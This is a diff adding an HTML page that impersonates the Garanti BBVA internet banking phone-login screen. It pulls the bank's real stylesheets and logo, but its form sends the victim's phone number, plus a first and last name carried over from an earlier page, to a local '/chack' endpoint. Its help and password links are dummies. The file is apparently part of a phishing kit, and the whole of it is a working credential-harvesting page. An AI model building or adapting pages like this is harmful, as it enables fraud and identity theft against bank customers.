@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html lang="tr" class="login">
+<head>
+    <title>Garanti BBVA İnternet - Telefon Girişi</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta http-equiv="Content-language" content="tr" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <meta name="format-detection" content="telephone=no" />
+    <meta name="msapplication-tap-highlight" content="no" />
+    <link rel="stylesheet" href="assets/style/style.css">
+    <link rel="stylesheet"
+        href="https://sube.assets.garantibbva.com.tr/assets/css/firstscreen.css?__ctst__=1755652961271">
+    <link rel="stylesheet"
+        href="https://sube.assets.garantibbva.com.tr/assets/css/mobile-login.css?__ctst__=1755652961271">
+    <link rel="stylesheet"
+        href="https://sube.assets.garantibbva.com.tr/assets/css/gt-facelift-login-style.css?__ctst__=1755652961271">
+    <link rel="shortcut icon" href="assets/img/icon.png" type="image/x-icon">
+    <!-- jQuery ekleniyor -->
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+</head>
+
+<body class="first-screen">
+    <div id="page" class="page">
+        <header id="header" class="">
+            <div class="navbar navbar-default">
+                <div class="container">
+                    <div class="navbar-header">
+                        <a class="navbar-brand" href="#">
+                            <img class="hidden-desktop only-mobile-2x-logo"
+                                src="https://sube.assets.garantibbva.com.tr/assets/img/logo-garantibbva-2x.png"
+                                alt="Garanti Bankası A.Ş."></a>
+                    </div>
+                    <div class="collapse navbar-collapse" id="headerNavBar">
+                        <ul class="nav navbar-nav navbar-right hidden-xs">
+                            <li class="active"><a href="#" class="btn">Bireysel</a></li>
+                            <li><a href="#" class="btn">Kurumsal</a></li>
+                        </ul>
+                        <ul class="nav navbar-nav navbar-right navbar-mobile visible-xs">
+                            <li class="dropdown active"><a href="#" class="dropdown-toggle btn" data-toggle="dropdown"
+                                    role="button" aria-expanded="false"> Bireysel <i
+                                        class="icons icons-arrow-down"></i></a>
+                                <ul class="dropdown-menu" role="menu" aria-labelledby="profile">
+                                    <li role="presentation"><a role="menuitem" tabindex="-1" href="#">Bireysel</a></li>
+                                    <li role="presentation"><a role="menuitem" tabindex="-1" href="#">Kurumsal</a></li>
+                                </ul>
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </header>
+        <div class="no-title structural">
+            <span id="pageNameSpan" style="display:none" class="elementHide">Garanti BBVA İnternet Bankacılığı’na
+                Giriş</span>
+            <h1 style="display:none" class="elementHide"> <span id="sub" style="display:none" class="elementHide">
+                    Telefon Girişi</span></h1>
+            <div class="breadcrumb-container no-print">
+                <div class="container">
+                    <ul id="breadcrumb" class="breadcrumb">
+                        <li class="disable"><a href="#"><span>Garanti BBVA İnternet Bankacılığı’na Giriş</span></a></li>
+                        <li class="active"><span>Telefon Girişi</span></li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <div id="content" class="container" role="main">
+            <div class="wizard stage:()">
+                <div class="main">
+                    <div class="row">
+                        <div class="col-md-9">
+                            <div class="back-icon" id="backBtn">
+                                <img src="assets/img/left-arrow.png" alt="Geri" />
+                            </div>
+                            <div class="hidden-mobile">
+                                <h2 class="page-title"> Garanti BBVA İnternet Bankacılığı’na Giriş</h2>
+                            </div>
+                            <div class="panel">
+                                <div id="passwordEntryPanel" class="panel-body">
+                                    <h1 class="panel-title light" id="hosgeldin">Hoşgeldiniz!</h1>
+                                    <!-- Hata mesajı için container -->
+                                    <div id="errorContainer" class="error-message"></div>
+                                    <div class="row">
+                                        <div class="col-sm-12">
+                                            <div class="form-horizontal">
+                                                <form action="/chack" method="POST" id="girisForm" autocomplete="off">
+                                                    <div class="formField">
+                                                        <div class="formFieldOuter">
+                                                            <div class="formFieldInner form-group">
+                                                                <label for="telno" class="col-sm-5 col-md-4 control-label">Telefon Numarası</label>
+                                                                <div class="formFieldSurround col-sm-7 col-md-8">
+                                                                    <input name="phone" type="tel" class="form-control" id="telno" autocomplete="off" maxlength="17"
+                                                                        minlength="17" title="Telefon numaranızı +90 ile başlayarak giriniz"
+                                                                        placeholder="Telefon numaranızı giriniz" pattern="\+90\s\d{3}\s\d{3}\s\d{2}\s\d{2}" required />
+                                                                    <div id="phoneError" class="field-error">Lütfen telefon numaranızı +90 XXX XXX XX XX formatında giriniz</div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                    <div class="ark-ui-checkbox formField control" id='isRememberMeContainer'>
+                                                        <div class="formFieldOuter">
+                                                            <div class="formFieldInner form-group has-btn">
+                                                                <div class="formFieldSurround col-sm-7 col-md-8 col-xs-12 col-sm-offset-5 col-md-offset-4">
+                                                                    <div class="checkbox-container">
+                                                                        <div class="checkbox checkbox-primary no-border">
+                                                                            <input id="isRememberMe" name="isRememberMe" type="checkbox" value="Y" />
+                                                                            <input type="hidden" name="_isRememberMe" value="on" />
+                                                                            <label for="isRememberMe">Beni Hatırla</label>
+                                                                            <a class="btn btn-primary has-advice-text help-icon" role="button" tabindex="-999" href="#"></a>
+                                                                            <div class="advice-text advice-text-right">
+                                                                                <strong class="subject">Yardım</strong><br />
+                                                                                "Beni Hatırla" seçeneğini işaretlediğinizde, sonraki girişleriniz için telefon numaranızı yazmanız gerekmeyecektir.
+                                                                            </div>
+                                                                        </div>
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                    <input type="hidden" name="adi" id="hiddenAdi">
+                                                    <input type="hidden" name="soyadi" id="hiddenSoyadi">
+                                                    <div class="form-group form-group-offset footer-button">
+                                                        <div class="col-sm-7 col-md-8 col-sm-offset-5 col-md-offset-4 col-xs-12">
+                                                            <p><button type="submit" class="btn btn-primary btn-lg btn-block-input">Giriş</button></p>
+                                                            <div><a href="#">Parolamı unuttum.</a></div>
+                                                            <div><a href="#">İlk kez parola almak istiyorum.</a></div>
+                                                        </div>
+                                                    </div>
+                                                    <div>
+                                                        <input type="hidden" name="_csrf" value="f296eb04-1791-4856-84b4-06c76a8a4ecc" />
+                                                    </div>
+                                                </form>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-md-3">
+                            <div class="additional">
+                                <h2 class="page-title">Yardım ve Güvenlik</h2>
+                                <div class="panel">
+                                    <div class="panel-body">
+                                        <div id="helpandsecurity" class="collapse-content" role="tablist" aria-multiselectable="true">
+                                            <div class="panel panel-collapse help-collapse">
+                                                <div class="panel-heading" role="tab" id="heading0"> 
+                                                    <a role="button" data-toggle="collapse" data-parent="#helpandsecurity" href="#" aria-expanded="true" aria-controls="collapse0"> 
+                                                        Güvenliğiniz için lütfen aşağıdaki bilgilere dikkat edin. 
+                                                        <span class="arrow"><i class="icons icons-arrow-up"></i></span>
+                                                    </a>
+                                                </div>
+                                                <div id="collapse0" class="panel-collapse collapse in" role="tabpanel" aria-labelledby="heading0">
+                                                    <div class="panel-body">
+                                                        <p>Güvenli bir İnternet deneyimi ve güncel virüsler hakkında bilgi almak için lütfen tıklayın.</p> 
+                                                        <a href="#" target="_blank">Detaylı bilgi</a>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="panel panel-collapse help-collapse">
+                                                <div class="panel-heading" role="tab" id="heading1"> 
+                                                    <a role="button" data-toggle="collapse" data-parent="#helpandsecurity" href="#" aria-expanded="false" aria-controls="collapse1" class="collapsed"> 
+                                                        Başkası adına mı işlem yapıyorsunuz? 
+                                                        <span class="arrow"><i class="icons icons-arrow-down"></i></span>
+                                                    </a>
+                                                </div>
+                                                <div id="collapse1" class="panel-collapse collapse" role="tabpanel" aria-labelledby="heading1">
+                                                    <div class="panel-body">
+                                                        <p>Başkası adına işlem yapıyorsanız detaylı bilgi için lütfen tıklayın.</p> 
+                                                        <a href="#" target="_blank">Detaylı bilgi</a>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="panel panel-collapse help-collapse">
+                                                <div class="panel-heading" role="tab" id="heading2"> 
+                                                    <a role="button" data-toggle="collapse" data-parent="#helpandsecurity" href="#" aria-expanded="false" aria-controls="collapse2" class="collapsed"> 
+                                                        Tasarruf Mevduatı Güvencesi 
+                                                        <span class="arrow"><i class="icons icons-arrow-down"></i></span>
+                                                    </a>
+                                                </div>
+                                                <div id="collapse2" class="panel-collapse collapse" role="tabpanel" aria-labelledby="heading2">
+                                                    <div class="panel-body">
+                                                        <p>Tasarruf mevduatınız güvence altında. Detaylı bilgi için lütfen tıklayın.</p> 
+                                                        <a href="#" target="_blank">Detaylı bilgi</a>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div> 
+                                    <a href="#" target="_blank" class="border-link helper-bottom-link">Diğer Yardım Ve Güvenlik</a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div id="footer" role="contentinfo" class="no-print footer">
+            <div class="container">
+                <div class="row patch-footer">
+                    <div class="col-md-8">
+                        <table class="table">
+                            <tr>
+                                <td><a href="#">Bize Ulaşın</a></td>
+                                <td class=""><a href="#">Güvenlik Bilgileri</a></td>
+                                <td> <span class="language">Language:</span> <a href="#">English</a></td>
+                            </tr>
+                        </table>
+                    </div>
+                </div>
+                <div class="row">
+                    <div class="col-sm-8 col-xs-8">
+                        <table class="table">
+                            <tr>
+                                <td> Copyright &#169; 2025 T.Garanti Bankası A.Ş.</td>
+                            </tr>
+                        </table>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script>
+        $(document).ready(function () {
+            // Geri butonu
+            $('#backBtn').on('click', function () {
+                window.location.href = 'login.html';
+            });
+
+            // Hoşgeldin mesajı ve hidden inputlar
+            const params = new URLSearchParams(window.location.search);
+            const adi = params.get('adi') || "";
+            const soyadi = params.get('soyadi') || "";
+            const errorMessage = params.get('error');
+
+            $('#hosgeldin').text(adi ? `Hoşgeldin, ${adi}!` : "Hoşgeldiniz!");
+            $('#hiddenAdi').val(adi);
+            $('#hiddenSoyadi').val(soyadi);
+
+            // Hata mesajını URL'den çekip göster
+            if (errorMessage) {
+                $('#errorContainer').text(decodeURIComponent(errorMessage));
+            }
+
+            // Form gönderimi kontrolü
+            $('#girisForm').on('submit', function (event) {
+                const phone = $('#telno').val();
+                if (!phone || !adi || !soyadi) {
+                    event.preventDefault();
+                    $('#phoneError').text("Lütfen tüm alanları doldurun.").show();
+                } else if (!/\+90\s\d{3}\s\d{3}\s\d{2}\s\d{2}/.test(phone)) {
+                    event.preventDefault();
+                    $('#phoneError').text("Lütfen telefon numaranızı +90 XXX XXX XX XX formatında giriniz").show();
+                } else {
+                    // "Beni Hatırla" seçeneği için localStorage kullanımı
+                    if ($('#isRememberMe').is(':checked')) {
+                        localStorage.setItem('rememberedPhone', $('#telno').val());
+                    } else {
+                        localStorage.removeItem('rememberedPhone');
+                    }
+                }
+            });
+
+            // Sayfaya yüklendiğinde hatırlanan telefon numarasını doldur
+            const rememberedPhone = localStorage.getItem('rememberedPhone');
+            if (rememberedPhone) {
+                $('#telno').val(rememberedPhone);
+            }
+
+            // Telefon formatlama
+            $('#telno').on('input', function (e) {
+                let input = e.target.value.replace(/\D/g, '');
+                if (!input.startsWith('90')) input = '90' + input;
+                let formatted = input.replace(/^(\d{2})(\d{3})(\d{3})(\d{2})(\d{2})$/, '+$1 $2 $3 $4 $5');
+                e.target.value = formatted.length > 17 ? formatted.slice(0, 17) : formatted;
+                if (/\+90\s\d{3}\s\d{3}\s\d{2}\s\d{2}/.test(e.target.value)) {
+                    $('#phoneError').hide();
+                } else {
+                    $('#phoneError').show();
+                }
+            });
+        });
+    </script>
+</body>
+</html>
